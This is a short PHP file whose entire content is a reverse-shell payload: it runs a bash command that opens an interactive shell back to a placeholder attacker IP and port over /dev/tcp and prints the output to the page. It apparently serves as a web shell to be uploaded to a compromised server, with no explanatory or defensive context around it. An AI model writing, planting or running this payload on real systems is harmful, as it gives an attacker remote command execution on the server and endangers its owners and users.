<?php
$output = `/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKER-IP"/ATTACKER-PORT 0>&1'`;
echo "<pre>$output</pre>";
?>
